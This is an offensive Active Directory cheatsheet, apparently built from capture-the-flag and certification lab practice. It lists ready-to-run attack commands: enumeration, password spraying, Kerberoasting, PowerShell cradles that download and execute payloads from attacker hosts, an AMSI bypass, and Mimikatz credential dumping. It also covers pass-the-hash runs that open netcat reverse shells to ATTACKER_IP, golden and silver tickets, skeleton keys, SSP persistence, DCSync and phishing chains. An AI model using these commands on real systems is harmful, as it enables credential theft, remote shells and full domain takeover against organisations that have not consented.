# Active Directory Cheatsheet

## TTL at Ping command:
- At windows boxes TTL is usually 128
- At linux boxes TTL is ususally 64
- (maybe ^^)

## RPC Enumeration:
```bash
rpcclient -U "" -N "IP" 		(Null session)
```
### Once connected:
- enumdomusers
- enumdomgroups
- enumprinters
- querygroup "RID"
- querygroupmem "RID"
- queryuser "RID"
- getdompwinfo
- getdomuserpwinfo "RID"
- querydominfo
- querydispinfo
- lsaenumsid
- enumprivs
- enumdomains
- lsaquery

> Can also do password spraying through it

> We can change user's password using RPC if we have permissions
```
setuserinfo2
setuserinfo2 audit2020 23 password123!
```

## ldapdomaindump:
- Dumps domain info using LDAP
```bash
ldapdomaindump -u '"DOMAIN"\"USERNAME"' -p "PASSWORD" "IP ADDRESS" -o "OUTPUT DIRECTORY"
```

## DNS Issues:
- Zone Transfers
```bash
dig axfr @"IP ADDRESS" "DOMAIN NAME"
```
- Information Leaking
```
dig @"IP ADDRESS" "DOMAIN NAME"
dig ns @"IP ADDRESS" "DOMAIN NAME"
dig nx @"IP ADDRESS" "DOMAIN NAME"
dig any @"IP ADDRESS" "DOMAIN NAME"
dig all @"IP ADDRESS" "DOMAIN NAME"
```

## nslookup (Can give DNS records):
```bash
nslookup
> server "IP ADDRESS OF DNS SERVER"
> 127.0.0.1 (Reverse Lookup)
> "MACHINE IP ADDRESS" (Reverse Lookup of a Machine)
```

## DNSRECON:
- We can use `dnsrecon` to check for hostnames as well
```bash
dnsrecon -d "IP ADDRESS" -r "IP ADDRESS RANGE"
```

## Enumerating using `net`
- We can use the `net` comand to enumerate if we have cmd access
- To get users
```bash
net user /domain
net user svcLDAP /domain
```

- To get groups
```bash
net group /domain
net group "Tier 0 Admins" /domain
```

- To enumerate the account policies
```bash
net accounts /domain
```

## Enumerating using `PowerView.ps1` and AD Module
- To use AD Module we can download the DLL or PS1 script from https://github.com/samratashok/ADModule
```bash
# PowerView.ps1
Get-NetDomain
Get-NetDomain -Domain moneycorp.local
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess" # For filteration
(Get-DomainPolicy -Domain moneycorp.local)."SystemAccess"
Get-NetDomainController
Get-NetDomainController -Domain moneycorp.local 
Get-NetUser
Get-NetUser -Properties Name, Description
Get-NetUser -Username <USERNAME>
Get-NetUser -Username <USERNAME> | Select-Object SamAccountName # Or just select
Get-UserProperty
Get-UserProperty -Properties pwdlastset
Get-UserProperty -Properties Name, Description
Find-UserField -SearchField Description
Find-UserField -SearchField Description -SearchTerm "built in"
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
Get-NetGroup
Get-NetGroup -Domain <DOMAIN>
Get-NetGroup -FullData
Get-NetGroup *admin*
Get-NetGroup -UserName <USERNAME>
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-NetLocalGroups -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
Get-NetLocalGroups -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
Get-NetLoggedon
Get-NetLoggedon -ComputerName <COMPUTER NAME>
Get-NetLoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Get-LastLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Invoke-ShareFinder -Verbose
Invoke-FileFinder -Verbose
Get-NetFileServer
Get-NetGPO
Get-NetGPO | select displayname
Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
Get-NetGPOGroup
Find-GPOComputerAdmin -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Find-GPOLocation -UserName student1 -Verbose
Get-NetOU
Get-NetOU -FullData
Get-NetGPO -GPOName '<GPO FROM GPLINK OBJECT OF GET-NETOU CMDLET>'
Get-ObjectACL -SamAccountName student1 -ResolveGUIDs
Get-ObjectACL -ADSprefix 'CN=Administrator,CN=Users' -Verbose
Get-ObjectACL -ADSpath "LDAP:\\CN=Domain Admins, CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
Invoke-ACLScanner -ResolveGUIDs
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
Get-NetDomainTrust
Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
Get-NetForest
Get-NetForest -Forest eurocorp.local
Get-NetForestDomain
Get-NetForestDomain -Forest eurocorp.local
Get-NetForestCatalog
Get-NetForestCatalog -Forest eurocorp.local
Get-NetForestTrust
Get-NetForestTrust -Forest eurocorp.local
Find-LocalAdminAccess -Verbose # Very noisy
Invoke-EnumerateLocalAdmin -Verbose
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDP Users"
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -Stealth

# AD Module
Get-ADDomain
Get-ADDomain -Identity moneycorp.local
(Get-ADDomain).DomainSID
Get-ADDomainController
Get-ADDomainController -DomainName moneycorp.local -Discover
Get-ADUser -Identity <USERNAME> -Properties * 
Get-ADUser -Identity <USERNAME> -Properties * | Select-Object SamAccountName  # Or just select
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name # To show what we can get
Get-ADUser -Filter * -Properties * | select Name. @{expression={[datetime]::FromFileTime($_.pwdlastset)}} # To show username and pwd last set
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name, Description
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter * | select name
Get-ADComputer -Filter * | 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name, OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{ Test-Connection -Count 1 -ComputerName $_.DNSHostName }
Get-ADGroup -Filter * | select name
Get-ADGroup -Filter * -Properties *
Get-ADGroup -FIlter 'Name -like "*admin*"' | select Name
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADPrincipalGroupMembership -Identity <USERNAME>
Get-GPO -All
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
Get-ADOrganizationalUnit -Filter * -Properties *
Get-GPO -Guid '<GPO FROM GPLINK OBJECT OF GET-NETOU CMDLET>'
(GET-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
Get-ADTrust
Get-ADTrust -Identity us.dollarcorp.moneycorp.local
Get-ADFores
Get-ADForest -Identity eurocorp.local
(Get-ADForest).Domain
Get-ADForest | select -ExpandProperty GlobalCatalogs
Get-ADForest -Filter 'msDS-TrustForestTrsutInfo -ne "$null"'

Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com # To find accounts to avoid in a password spray to not have lockout
Get-ADDomain -Server za.tryhackme.com
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
``` 
- We can also use .NET Classes to enumerate if we wanted to
```c
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

## IF YOU GET THE FINDALL ERROR CREATE A CREDENTIALED OBJECT!!!!
```bash
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('test.local\ace', $SecPassword)
```

## IPC Share
- If we have IPC share with read only anonymus access we can dump information
```bash
lookupsid.py anonymous@"IP ADDRESS"
```
 
## SMB Enumeration:
- Look for anonymous login using `smbclient`
```bash
smbclient -L \\"IP ADDRESS"
```
- If we want to download everything using `smbclient`
```bash
smbclient //"IP ADDRESS"/"SHARE"
recurse ON
prompt OFF
mget *
```
- Look for access in shares using `smbmap`
```bash
smbmap -H "IP ADDRESS" -u null

smbmap -u "" -p "" -H "IP ADDRESS"

smbmap -u anonymous -H "IP ADDRESS"
```
- We can also list all files recursivly
```bash
smbmap -u "" -p "" -R "SHARE NAME" -H "IP ADDRESS"
```
- If we want to download a file
```bash
smbmap -u "" -p "" -R "SHARE NAME" -H "IP ADDRESS" -A "FILE NAME" -q
```
- We can then locate it
- If found files through SMB or FTP download them and use `exiftool` to see if they leak a username

## Mount SMB Shares:
- We can mount SMB shares using
```bash
mount -t cifs //10.10.10.192/profiles$ /mnt
``` 

## smbpasswd:
- If we get a `NT_STATUS_PASSWORD_MUST_CHANGE` error we can change the pass using `smbpasswd`
```bash
smbpasswd -r "IP ADDRESS" -U "USERNAME"
```

## ldapsearch (to query ldap server for domain names and other information):
- -x = Anonymous bind
- -h = host
```bash
ldapsearch -h "IP" -x
ldapsearch -H ldap://10.129.134.37 -x
```
- -s = scope (which is usually set to base)
- namingcontext = finding  the domain name
```bash
ldapsearch -h "IP" -x -s base namingcontext
```
- -b = base
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")"
```
- This will give a lot of ldap information
- To search the output using ldapsearch we can use
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' # This will give out the users list on the ldap server
```
- To get usernames out of it we can do 
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' sAMAccountName
```
- To filter for usernames just use grep
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=User)' sAMAccountName | grep -i sAMAccountName | awk '{print $2}'
```
- To search for a string in the output like default passwords
```bash
ldapsearch -h 192.168.80.7 -x -b "DC=pwn,DC=local" | grep -i "default"
```
- If some creds are found they can be used to further enumerate LDAP
```bash
ldapsearch -h 10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
```
- Can also do something like
```bash
ldapsearch -LLL -x -h 192.168.80.7 -p 389 -b "DC=pwn,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' "(objectClass=User)" sAMAccountName
```
- If gives errors use this instead of `-h`
```bash
-H ldap://10.10.179.238
```

## Generating password list from a list of common passwords:
- Make a password list of all months, seasons, common words like password, secret (Forest.HTB for reference)
- Then use bash to add years to them
```bash
for i in $(cat passwords.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > t
mv t > passlist.txt
```
- Then use hashcat to generate pass list
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule
```
- Also adding a symbol to password
```bash
for i in $(cat passwords.txt); do echo $i; echo ${i}\!; done > t
mv t > passlist.txt
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule
```
- We can use another rule to embed cpaital letters in the passlist
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggels1.rule
```
- But it may have duplicates so
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggels1.rule | sort -u > p
```
- To just get the passwords which have length more than 7
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' > p
mv p > passlist.txt
```

## Group Policy Decrypt (If we have SYSVOL):
- If we get access to SYSVOL share or we have any other way to retrieve Group Policies, we can extract the `Groups.xml` file containing username and cpassword
- With that we can use `gpp-decrypt` to decrypt the cpassword
```bash
gpp-decrypt "CPASSWORD"
```

## Crackmapexec:
- To check for password policy before doing a password spray to avoid account lockdown
```bash
crackmapexec smb "IP ADDRESS" --pass-pol -u '' -p ''
```
- We can also see it from `enum4linux` or `polenum`
- To do password spraying attack we can do 
```bash
crackmapexec smb "IP ADDRESS" -u "USER LIST" -p "PASS LIST"
```
- If we get a password we can then login to it
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -p "PASSWORD"
```
- If it says `pwned!` we can then use `psexec.py` to open up a shell
- If not we can see if we can list shares using it
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -p "PASSWORD" --shares
```
- We can use crackmapexec to also login using hashes
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -H "HASH"
```

## psexec.py:
- We can use `psexec.py` to login using the hashes
```bash
psexec.py -hashes "NT:LM" "USERNAME"@"IP ADDRESS"
psexec.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
```

## GetADUsers.py:
- If we have a username and password we can use `GetADUsers.py` to see users of AD
```bash
GetADUsers.py -all -dc-ip "IP ADDRESS" "DOMAIN"/"USERNAME"
```

## Bookmarks
```bash
type 'C:\Users\AHMED SHER\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak' |findstr.exe /c "name url" | findstr.exe /v "type"
```

## Initial Access Using phishing
- Scenario 1
```
LNK with nslookup to DNS
DNS records with IEX to VBS into tmp
VBS to run exe and add persistence
```

- Scenario 2
```
LNK with UNC path of a non existent share
Responder to catch hashes
```

- Scenario 3
```

```

## Privilege Escalation Methods:
- To find we can use
```
Winpeas
beroot
Invoke-Privesc
PowerUp.ps1
```
- Unquoted Service Paths can be exploited using `PowerView.ps1`
- We can find them using PowerUp or general queries
```bash
# PowerUp
Get-ServiceUnquoted -Verbose
# General
wmic service get name,pathname | findstr /i /v system32 | findstr /v \"
```
- And then exploit them
```bash
Invoke-ServiceAbuse -Name AbyssWebServer -Command 'net localgroup Administrators dcorp\student13 /add'
```
- DCSync (Exchange Windows Permissions)(Check for `Outbound Control Rights` from `BloodHound`)
- WinLogon AutoCreds
```bash
reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" # ON WINDOWS
```
- Stored credentials
```bash
cmdkey /list
```

## File Transfer Methods:
- SMB Server
```bash
impacket-smbserver "SHARE NAME" $(pwd) -smb2support -user "USERNAME" -password "PASSWORD" # Starts the SMB Server

# ON WINDOWS
$pass = convertto-securestring "PASSWORD" -AsPlainText -Force # To convert it to useable password
$cred = New-Object System.Management.Automation.PSCredential("'USERNAME'", $pass) # Setting up cred object with username and password
New-PSDrive -Name "USERNAME" -PSProvider FileSystem -Credential $cred -Root \\"IP ADDRESS"\"SHARE NAME # Connecting the drive to windows
cd "USERNAME": # Get into the drive
```
- Cert Util
```bash
certutil -urlcache -f http://10.50.27.84:8000/ok.exe ok.exe
```
- Powershell
```bash
powershell "IEX(New-Object Net.WebClient).downloadString('http://172.16.99.13/bypass.ps1')"

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"

powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")

Invoke-WebRequest "http://10.50.27.84:8000/PowerView.ps1" -OutFile "PowerView.ps1"
```
- More methods using powershell
```bash
# Method 1:
iex (New-Object Net.WebClient).DownloadString('<URL>')

# Method 2:
$ie = New-Object -ComObject InternetExplorer.Application
$ie.visible=$False
$ie.navigatate('<URL>')
sleep 5
$response=$ie.Document.Body.innerHTML
$ie.quit()
iex $response

# Method 3:
iex (iwr '<URL>')

# Method 4:
$h = New-Object -ComObject Msxm12.XMLHTTP
$h =.open('GET', '<URL>', $false)
$h.send()
iex $h.responseText

# Method 5:
$wr = [System.NET.webRequest]::Create('<URL>')
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

- Converting normal powershell ps1 to base64
```bash
cat rev.ps1 | iconv -t UTF16-LE | base64 -w 0 
``` 

- Then call it using
```bash
powershell.exe -enc "ENCODED COMMAND"
```
## Kerbrute:
- We can check if the user exist on domain controller using
```bash
/opt/kerbrute/kerbrute userenum --dc 10.129.97.156 -d BLACKFIELD.local actual-users.txt
```

## Kerberoasting Cheatsheet:
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
- If we have a account username and password we can kerberoast using it
```bash
GetUserSPNs.py "DOMAIN"/"USERNAME":"PASSWORD" -request -outputfile hash

GetUserSPNs.py -dc-ip "DC IP" "DOMAIN"/"USERNAME":"PASSWORD" -request -outputfile hash
```
- We can then crack it using hashcat
```bash
hashcat -m 13100 -a 0 hash ~/Desktop/rockyou.txt --force
```
- If we get `CLOCK_SKET_TOO_GREAT` match the time with the DC time
```bash
# ON LINUX
date
# ON WINDOWS
date
# ON LINUX
date -s "TIME OF DC"
```

## AS-REP Roasting:
- This attack is used for users that do not need preauthentication in kerberos
```bash
GetNPUsers.py -dc-ip "IP ADDRESS" -request "'DOMAIN/'" -format hashcat
```
- Also can be done using a username list 
```bash
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip "IP ADDRESS" "DOMAIN"/${user} -format hashcat | grep -v Impacket; done
```
- We can then crack it using hashcat or john
```bash
hashcat -m 18200 hash.txt ~/Desktop/rockyou.txt --force
hashcat -m 18200 hash.txt ~/Desktop/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
john --format=krb5asrep -w=~/Desktop/rockyou.txt hash.txt
```

## Evil-WinRM:
- If we have password and username for a user or service account, with winrm enabled, we can use this to login
```bash
evil-winrm -u "USERNAME" -p "PASSWORD" -i "IP ADDRESS"
```

## Powershell Remoting
- We can use powershell remoting to do lateral movement
- We can use interactive session with
```bash
$sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
Enter-PSSession $sess
```
- We can use non interactive session with
```bash
Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{whoami;hostname}
```
- If we want to run it against all the servers in a machine which is very helpful
```bash
Invoke-Command -ScriptBlock{Get-Process} -ComputerName (Get-Content list.txt)
```
- We can also use it for pass the hash attacks
```bash
Invoke-Command -FilePath C:\scripts\Get-PassHash.ps1 -ComputerName (Get-Content list.txt)
```
- We can also use this to pass locally loaded function over but it may not work if the target has appropriate protections in place
```bash
Invoke-Command -ScriptBlock${function:Invoke-Privesc} -ComputerName (Get-Content list.txt)
# OR To check arguments
Invoke-Command -ScriptBlock${function:Invoke-Privesc} -ComputerName (Get-Content list.txt) -ArgumentList
```
- In interactive sessions, we can also use this using
```bash
$sess = New-PSSesion -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -FilePath C:\scripts\hello.ps1 -Session $sess
# Then when we log into the session interactively we can use that function
Enter-PSSession -ComputerName $sess
```
```bash
$sess = New-PSSesion -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -Session $sess -ScriptBlock{$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock{$proc.name}
```
- In case of having credentials we can do
```bash
$username = 'serverAdmin'
$password = 'EZpass4ever'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Enter-PSSession -Computername thmiis.za.tryhackme.com -Credential $credential
```

## Misconfigured Machine Accounts
- We can use this query in bloodhound to look for misconfigured machine accounts
```bash
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

## SeBackupPrivilege:
- Check Blackfield notes

## Things to check when we have password access in a domain:
- winrm
- smb
- ldap
- rpc
- lookupsid
- bloodhound
- kerberoast
- GetADUsers.py
- ASREP Roast

## Powercat:
- Netcat for powershell
```bash
. .\powercat.ps1
powercat -l -v -p 443 -t 1000
```

## Bloodhound:
- Download a new copy of bloodhound because it gets updated frequently
- To get a new neo4j account we can delete the password file
```bash
locate neo4j | grep auth # Delete the auth file
bloodhound --no-sandbox # Start bloodhound with the password you set earlier

.\SharpHound.exe -c all --domain htb.local --ldapusername svc-alfresco --ldappassword s3rvice # On Windows
```
- If didnt work you can use `bloodhound-python` injestors instead
```bash
bloodhound-python -c all --domain htb.local -u svc-alfresco -p s3rvice -ns 10.129.149.232 -v
```
- Can also use powershell scripts
```bash
Import-Module .\Sharphound.ps1    

Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip
```
- You can change things in `SharpHound` to make more stealthy
- We can use pathfinding to find our path to the desired node from owned node

## Persistence in Active Directory:
- We can create new users
```bash
$pass = convertto-securestring "password123!" -AsPlainText -Force
New-ADUser -Name "ace" -Description "very imp user" -Enabled $true -AccountPassword $pass
```

## Rubeus:
-

## PowerSploit:
- Import `PowerView.ps1`
- To find users with DCSync perms
```bash
Get-ObjectACL "DC=pwn,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')}
```
- Check the identity of user
```bash
Get-ADUser -Identity S-1-5-21-899434533-4132491356-2237190077-1657 
```

## ShapView:
- C# implementation of `PowerView.ps1`
```
ShapView.exe Get-ObjectACL "DC=pwn,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')}
```

## PowerUp:
- Import `PowerUp.ps1` for checking privelege escalation paths
```
Import PowerUp.ps1
Invoke-AllChecks
```

## SharpUp:
- C# implementation of `PowerUp`
```
sharpup.exe audit
```

## Seatbelt:
- Post exploitaiton enumeration tool
```
Seatbelt.exe -group=all -full
```

## Checking Windows Defender Exclusion paths:
- We can check them using
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

## SharpSploit:
- Has a lot of tools we can use through DLL
- To import the DLL in a binary we can use the following methods
- Powershell Method using DLL on target:
```cs
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
```
- Powershell Method using remote DLL:
```cs
[System.Reflection.Assembly]::Load(new-object net.webclient).DownloadData("https://example.com/SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
```
- C# Method using remote DLL:
```cs
public class Program {
    public static void Main() {
        System.Reflection.Assembly.Load(new System.Net.WebClient().DownloadData("https://example.com/SharpSploit.dll")).GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""));
    }
}
```
- We can use this as reference code but we will need to have the `SharpSploit.dll` on the target as well, unless we use `ILMerge` or `Costura` to merge the binary and the DLL
```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpSploit;


namespace SharpSploitWhoAmI
{
    class Program
    {
        static void Main(string[] args)
        {
            SharpSploit.Credentials.Tokens tokens = new SharpSploit.Credentials.Tokens();
            string whoami = tokens.WhoAmI();
            Console.WriteLine(whoami);
            
        }
    }
}
```
- In `Costura` method, Write the code first then on the Reference section in Visual Studio add reference of the `SharpSploit.dll` and then compile
- We can also use `SharpGen` to generate a binary

## Reflection Method:
- Can use this to load a payload from url using reflection method without touching disk
- Need to defeat AMSI before
```c
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[TotallyNotMal.Program]::Main()
```
- To work with a DLL on disk
```bash
[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes(".\amsibypass.dll"))
[Bypass.Asmi] # Bypass is a namespace. Amsi is a class in that namespace.
[Bypass.Asmi]::Patch() # Patch is a function in the Amsi class in the Bypass namespace.
```

## WinPEAS:
- Enumerate privelege escalation methods
- Can be obfuscated in `Visual Studio` using `dotfuscator`

## Mimikatz:
- Commands to use with `mimikatz.exe`
```bash
coffee # To test if it works

privilege::debug
token::elevate

sekurlsa::logonPasswords

# To dump SAM hashes. Only local users. No domain users.
lsadump::sam

# To dump LSASS hashes. Local users and recently logged on domain users.
sekurlsa::msv
lsadump::lsa /patch

# To dump cleartext credentials
lsadump::secrets

# Can use Pass The Hash to execute commands like reverse shells
token::revert # Cant work with elevated privileges
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.97 5555"
nc -lvnp 5555 # On kali

# To dump kerberos tickets and session keys for Pass The Ticket attacks
sekurlsa::tickets /export

# To use the client session tickets for Pass The Attack
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi # [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi > is what the ticket looks like

# Can use it for Overpass The Hash or Pass The Keys attacks 
sekurlsa::ekeys

# Depending on the keys we find we can use these methods
# RC4 hash:
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
# AES128 hash:
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
# AES256 hash:
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

# Golden Ticket
lsadump::dcsync /user:za\krbtgt
```
- We can also use `Invoke-Mimikatz.ps1` for the same purposes
```bash
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1", "sys2")
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain dollarcorp.moneycorp.local /ntlm:<HASH> /run:powershell.exe"' # Over pass the hash attack
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local # Dumping hashes

# Golden Ticket
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' # Getting krbtgt hash
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:600 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"' # Creating Golden Tickets

# DC Sync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Silver Ticket
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:7a989885c483d28df1c60dbf1be54f86 /ptt"'

# Services we can use for Silver Ticket
# https://adsecurity.org/?p=2011
# Like `CIFS` will allow us to view files
# CIFS = View Files
# HOST = Scheduling Tasks
# WSMAN = Powershell Remoting
# After getting HOST we can use this to create scheduled tasks:
schtasks /create /S dcrop-dc.dollarcorp.moneycorp.local /SC weekly /RU "NT AUTHORITY\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.42/Invoke-PowerShellTCP.ps1'')'"
# To run them
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"

# Skeleton Keys
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\Administrator # To use the password `mimikatz`

# DSRM Hash dump for persistence
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc
# Then before using it we need to alter the logon behavior first
New-ItemProperty "'HKLM:\System\CurrentControlSet\Control\Lsa\'" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
# Use this as local administrator on any machine to get domain admin
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

# Persistence using Custom SSP
# Method 1:
Invoke-Mimikatz -Command '"misc::memssp"'
# Method 2:
# The `mimilib.dll` needs to be on disk
# Drop it in System32 and add it to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
$packages: Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $package
# Now we can have the login logs in `C:\Windows\System32\kiwissp.log`
```

## DACLs/ACLs:
`acl-pwn`
- Resource = https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
- We can abuse the DACLs/ACLs to pwn the Active Directory Network
- `WriteDACL`
- Can lead to DCSync Attack
- Import `PowerView.ps1`
- Use the commands mentioned in `Abuse Info` of `WriteDACL` in `BloodHound`
```powershell
$pass = convertto-securestring "PASSWORD OF USER THAT HAS WRITE DACL PERMS" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('"DOMAIN"\"PASSWORD OF USER THAT HAS WRITE DACL PERMS"', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DOMAIN BUT IN LDAP FORMAT (DC=htb, DC=local)" -PrincipalIdentity "USERNAME" -Rights DCSync
```
- Then we can use `secretsdump.py` to dump everything
```bash
secretsdump.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
```
- We can then use these hashes to see if we pwn any user using `crackmapexec`
